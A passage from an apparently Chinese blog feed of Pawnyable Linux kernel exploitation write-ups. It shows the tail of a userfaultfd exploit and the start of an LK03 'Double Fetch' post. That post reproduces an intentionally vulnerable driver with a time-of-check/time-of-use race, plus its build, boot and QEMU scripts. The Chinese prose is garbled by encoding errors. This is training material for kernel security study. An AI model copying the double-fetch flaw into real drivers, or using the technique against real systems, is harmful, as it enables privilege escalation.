punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> kheap <span class="token operator">+</span> <span class="token number">0x20</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/b378e4cf01ab26aef803763b52011041_MD5.jpeg"></p><blockquote><p>é™„ä»¶ï¼š<a href="https://pawnyable.cafe/linux-kernel/LK04/distfiles/LK04.tar.gz">LK04.tar.gz</a><br>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.wohin.me/posts/pawnyable-0303/">Linux Kernel PWN | 040303 Pawnyableä¹‹userfaultfd (wohin.me)</a><br><a href="https://pawnyable-cafe.translate.goog/linux-kernel/LK04/uffd.html?_x_tr_sl=auto&_x_tr_tl=zh-CN&_x_tr_hl=zh-CN&_x_tr_pto=wapp">ä½¿ç”¨ userfaultfd | å¯å…¸å½“ï¼ (pawnyable-cafe.translate.goog)</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux Kernel pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LK03 Double Fetch</title>
      <link href="/2024/03/03/LK03%20Double%20Fetch/"/>
      <url>/2024/03/03/LK03%20Double%20Fetch/</url>
      
        <content type="html"><![CDATA[<p>LKMæºç ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/module.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/kernel.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/cdev.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/fs.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/uaccess.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/slab.h></span></span><span class="token function">MODULE_LICENSE</span><span class="token punctuation">(</span><span class="token string">"GPL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MODULE_AUTHOR</span><span class="token punctuation">(</span><span class="token string">"ptr-yudai"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MODULE_DESCRIPTION</span><span class="token punctuation">(</span><span class="token string">"Dexter - Vulnerable Kernel Driver for Pawnyable"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DEVICE_NAME</span> <span class="token string">"dexter"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUFFER_SIZE</span> <span class="token expression"><span class="token number">0x20</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_GET</span> <span class="token expression"><span class="token number">0xdec50001</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_SET</span> <span class="token expression"><span class="token number">0xdec50002</span></span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span>  <span class="token class-name">size_t</span> len<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token class-name">request_t</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">module_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  filp<span class="token operator">-></span>private_data <span class="token operator">=</span> <span class="token function">kzalloc</span><span class="token punctuation">(</span>BUFFER_SIZE<span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>filp<span class="token operator">-></span>private_data<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">module_close</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>filp<span class="token operator">-></span>private_data<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">verify_request</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>reqp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token class-name">request_t</span> req<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> reqp<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">request_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>ptr <span class="token operator">||</span> req<span class="token punctuation">.</span>len <span class="token operator">></span> BUFFER_SIZE<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">long</span> <span class="token function">copy_data_to_user</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>reqp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token class-name">request_t</span> req<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> reqp<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">request_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_to_user</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>ptr<span class="token punctuation">,</span> filp<span class="token operator">-></span>private_data<span class="token punctuation">,</span> req<span class="token punctuation">.</span>len<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">long</span> <span class="token function">copy_data_from_user</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>reqp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token class-name">request_t</span> req<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> reqp<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">request_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span>filp<span class="token operator">-></span>private_data<span class="token punctuation">,</span> req<span class="token punctuation">.</span>ptr<span class="token punctuation">,</span> req<span class="token punctuation">.</span>len<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">long</span> <span class="token function">module_ioctl</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">,</span>                         <span class="token keyword">unsigned</span> <span class="token keyword">int</span> cmd<span class="token punctuation">,</span>                         <span class="token keyword">unsigned</span> <span class="token keyword">long</span> arg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">verify_request</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>arg<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token keyword">switch</span> <span class="token punctuation">(</span>cmd<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> CMD_GET<span class="token operator">:</span> <span class="token keyword">return</span> <span class="token function">copy_data_to_user</span><span class="token punctuation">(</span>filp<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>arg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> CMD_SET<span class="token operator">:</span> <span class="token keyword">return</span> <span class="token function">copy_data_from_user</span><span class="token punctuation">(</span>filp<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>arg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token operator">:</span> <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">file_operations</span> module_fops <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span>owner   <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">,</span>  <span class="token punctuation">.</span>open    <span class="token operator">=</span> module_open<span class="token punctuation">,</span>  <span class="token punctuation">.</span>release <span class="token operator">=</span> module_close<span class="token punctuation">,</span>  <span class="token punctuation">.</span>unlocked_ioctl <span class="token operator">=</span> module_ioctl<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token class-name">dev_t</span> dev_id<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">cdev</span> c_dev<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">int</span> __init <span class="token function">module_initialize</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">alloc_chrdev_region</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dev_id<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> DEVICE_NAME<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>  <span class="token function">cdev_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> <span class="token operator">&amp;</span>module_fops<span class="token punctuation">)</span><span class="token punctuation">;</span>  c_dev<span class="token punctuation">.</span>owner <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">cdev_add</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> __exit <span class="token function">module_cleanup</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">cdev_del</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">module_init</span><span class="token punctuation">(</span>module_initialize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">module_exit</span><span class="token punctuation">(</span>module_cleanup<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Makefileï¼š</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">obj-m <span class="token operator">:=</span> dexter.o<span class="token comment">#KBUILD_DIR := /lib/modules/$(KVERSION)/build</span>KBUILD_DIR <span class="token operator">:=</span> /home/ptr/armoury/buildroot/output/build/linux-5.17.1<span class="token target symbol">all</span><span class="token punctuation">:</span><span class="token variable">$</span><span class="token punctuation">(</span>MAKE<span class="token punctuation">)</span> -C <span class="token variable">$</span><span class="token punctuation">(</span>KBUILD_DIR<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span><span class="token function">shell</span> pwd<span class="token punctuation">)</span> modules<span class="token target symbol">clean</span><span class="token punctuation">:</span><span class="token variable">$</span><span class="token punctuation">(</span>MAKE<span class="token punctuation">)</span> -C <span class="token variable">$</span><span class="token punctuation">(</span>KBUILD_DIR<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span><span class="token function">shell</span> pwd<span class="token punctuation">)</span> clean<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="ä¸€ã€LK03-Double-Fetch"><a href="#ä¸€ã€LK03-Double-Fetch" class="headerlink" title="ä¸€ã€LK03 Double Fetch"></a>ä¸€ã€LK03 Double Fetch</h1><h2 id="ä¸€-é€†å‘åˆ†æ"><a href="#ä¸€-é€†å‘åˆ†æ" class="headerlink" title="(ä¸€)é€†å‘åˆ†æ"></a>(ä¸€)é€†å‘åˆ†æ</h2><h3 id="S99pawnyable"><a href="#S99pawnyable" class="headerlink" title="S99pawnyable"></a>S99pawnyable</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>mdev <span class="token parameter variable">-s</span><span class="token function">mount</span> <span class="token parameter variable">-t</span> proc none /proc<span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /dev/pts<span class="token function">mount</span> <span class="token parameter variable">-vt</span> devpts <span class="token parameter variable">-o</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">4</span>,mode<span class="token operator">=</span><span class="token number">620</span> none /dev/pts<span class="token function">chmod</span> <span class="token number">666</span> /dev/ptmxstty <span class="token parameter variable">-opost</span><span class="token builtin class-name">echo</span> <span class="token number">2</span> <span class="token operator">></span> /proc/sys/kernel/kptr_restrict<span class="token builtin class-name">echo</span> <span class="token number">1</span> <span class="token operator">></span> /proc/sys/kernel/dmesg_restrictinsmod /root/dexter.ko<span class="token function">mknod</span> <span class="token parameter variable">-m</span> <span class="token number">666</span> /dev/dexter c <span class="token variable"><span class="token variable">`</span><span class="token function">grep</span> dexter /proc/devices <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $1;&#125;'</span><span class="token variable">`</span></span> <span class="token number">0</span><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>Boot took <span class="token variable"><span class="token variable">$(</span><span class="token function">cut</span> -d<span class="token string">' '</span> <span class="token parameter variable">-f1</span> /proc/uptime<span class="token variable">)</span></span> seconds<span class="token entity" title="\n">\n</span>"</span><span class="token builtin class-name">echo</span> <span class="token string">"[ Dexter (LK03) - Pawnyable ]"</span>setsid cttyhack setuidgid <span class="token number">1337</span> <span class="token function">sh</span><span class="token function">umount</span> /procpoweroff <span class="token parameter variable">-d</span> <span class="token number">0</span> <span class="token parameter variable">-f</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="run-sh"><a href="#run-sh" class="headerlink" title="run.sh"></a>run.sh</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>qemu-system-x86_64 <span class="token punctuation">\</span>    <span class="token parameter variable">-m</span> 64M <span class="token punctuation">\</span>    <span class="token parameter variable">-nographic</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-kernel</span> bzImage <span class="token punctuation">\</span>    <span class="token parameter variable">-append</span> <span class="token string">"console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on kaslr"</span> <span class="token punctuation">\</span>    -no-reboot <span class="token punctuation">\</span>    <span class="token parameter variable">-cpu</span> kvm64,+smep <span class="token punctuation">\</span>    <span class="token parameter variable">-smp</span> <span class="token number">2</span> <span class="token punctuation">\</span>    <span class="token parameter variable">-monitor</span> /dev/null <span class="token punctuation">\</span>    <span class="token parameter variable">-initrd</span> rootfs.cpio <span class="token punctuation">\</span>    <span class="token parameter variable">-net</span> nic,model<span class="token operator">=</span>virtio <span class="token punctuation">\</span>    <span class="token parameter variable">-net</span> user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¼€äº†smepã€kaslrã€kptiï¼Œæ²¡æœ‰smapï¼›å€¼å¾—æ³¨æ„çš„æ˜¯-smpä¸º2</p><h3 id="dexter-ko"><a href="#dexter-ko" class="headerlink" title="dexter.ko"></a>dexter.ko</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATHSymbolsFORTIFYFortifiedFortifiableFILENo RELRO        No canary found   NX disabled   REL             No RPATH   No RUNPATH   <span class="token number">50</span><span class="token punctuation">)</span> Symbols  No<span class="token number">0</span><span class="token number">0</span>./dexter.ko<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ•´ä¸ªæ¨¡å—çš„æ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼ˆä¸ºçªå‡ºé‡ç‚¹ï¼Œåˆ é™¤äº†ä¸€äº›æ‰“å°ã€åˆ¤æ–­å’Œè¿”å›è¯­å¥ï¼‰ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUFFER_SIZE</span> <span class="token expression"><span class="token number">0x20</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_GET</span> <span class="token expression"><span class="token number">0xdec50001</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CMD_SET</span> <span class="token expression"><span class="token number">0xdec50002</span></span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span>  <span class="token class-name">size_t</span> len<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token class-name">request_t</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">module_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  filp<span class="token operator">-></span>private_data <span class="token operator">=</span> <span class="token function">kzalloc</span><span class="token punctuation">(</span>BUFFER_SIZE<span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>filp<span class="token operator">-></span>private_data<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">module_close</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>filp<span class="token operator">-></span>private_data<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">verify_request</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>reqp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token class-name">request_t</span> req<span class="token punctuation">;</span>  <span class="token function">copy_from_user</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> reqp<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">request_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>ptr <span class="token operator">||</span> req<span class="token punctuation">.</span>len <span class="token operator">></span> BUFFER_SIZE<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">long</span> <span class="token function">copy_data_to_user</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>reqp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token class-name">request_t</span> req<span class="token punctuation">;</span>  <span class="token function">copy_from_user</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> reqp<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">request_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">copy_to_user</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>ptr<span class="token punctuation">,</span> filp<span class="token operator">-></span>private_data<span class="token punctuation">,</span> req<span class="token punctuation">.</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">long</span> <span class="token function">copy_data_from_user</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>reqp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token class-name">request_t</span> req<span class="token punctuation">;</span>  <span class="token function">copy_from_user</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> reqp<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">request_t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">copy_from_user</span><span class="token punctuation">(</span>filp<span class="token operator">-></span>private_data<span class="token punctuation">,</span> req<span class="token punctuation">.</span>ptr<span class="token punctuation">,</span> req<span class="token punctuation">.</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">long</span> <span class="token function">module_ioctl</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>filp<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> cmd<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> arg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">verify_request</span><span 